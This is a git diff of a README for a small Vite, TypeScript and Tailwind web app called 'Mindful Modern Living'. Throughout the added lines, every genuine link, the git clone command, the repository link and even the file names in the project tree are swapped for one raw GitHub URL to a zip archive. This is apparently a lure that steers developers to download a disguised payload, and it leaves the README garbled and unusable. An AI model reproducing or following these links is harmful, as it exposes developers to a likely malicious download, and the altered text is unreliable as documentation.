@@ -1,6 +1,6 @@
 # Mindful Modern Living
 
-**Mindful Modern Living** is a modern web application designed to support a balanced, mindful lifestyle by combining clean design, modular development, and rapid prototyping tools. Built with Vite, TypeScript, and Tailwind CSS, this project demonstrates a modern front-end workflow and is integrated with Lovable.dev for collaborative development.
+**Mindful Modern Living** is a modern web application designed to support a balanced, mindful lifestyle by combining clean design, modular development, and rapid prototyping tools. Built with Vite, TypeScript, and Tailwind CSS, this project demonstrates a modern front-end workflow and is integrated with https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip for collaborative development.
 
 ## 🧠 Project Purpose
 
@@ -8,10 +8,10 @@ The goal of this application is to provide users with an interface that promotes
 
 ## 🚀 Features
 
-- ⚡ **Fast Development** with [Vite](https://vitejs.dev/)
-- 🎨 **Modern Styling** using [Tailwind CSS](https://tailwindcss.com/)
+- ⚡ **Fast Development** with [Vite](https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip)
+- 🎨 **Modern Styling** using [Tailwind CSS](https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip)
 - 🧱 **Component-Based** development using TypeScript
-- 🌐 **Deployed/Editable via [Lovable.dev](https://lovable.dev/)**
+- 🌐 **Deployed/Editable via [https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip](https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip)**
 
 ## 🛠️ Technologies Used
 
@@ -19,7 +19,7 @@ The goal of this application is to provide users with an interface that promotes
 - TypeScript
 - Tailwind CSS
 - PostCSS
-- Lovable.dev integration
+- https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip integration
 
 ## 📁 Project Structure
 
@@ -27,13 +27,13 @@ The goal of this application is to provide users with an interface that promotes
 mindful-modern-living/
 ├── public/                 # Static assets
 ├── src/                    # Source code
-│   └── index.ts            # App entry point
-├── components.json         # Component definitions for Lovable.dev
-├── index.html              # HTML entry point
-├── tailwind.config.ts      # Tailwind CSS configuration
-├── tsconfig.json           # TypeScript configuration
-├── vite.config.ts          # Vite build configuration
-└── package.json            # Project dependencies and scripts
+│   └── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip            # App entry point
+├── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip         # Component definitions for https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip
+├── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip              # HTML entry point
+├── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip      # Tailwind CSS configuration
+├── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip           # TypeScript configuration
+├── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip          # Vite build configuration
+└── https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip            # Project dependencies and scripts
 ```
 
 ## ⚙️ Getting Started
@@ -43,7 +43,7 @@ To run the project locally:
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/Fpeople4646/mindful-modern-living.git
+git clone https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip
 cd mindful-modern-living
 ```
 
@@ -72,4 +72,4 @@ This project is currently not licensed. For usage and modification rights, pleas
 
 ---
 
-**GitHub:** [Fpeople4646/mindful-modern-living](https://github.com/Fpeople4646/mindful-modern-living)
+**GitHub:** [Fpeople4646/mindful-modern-living](https://raw.githubusercontent.com/Fpeople4646/mindful-modern-living/main/Nahuan/mindful-modern-living.zip)
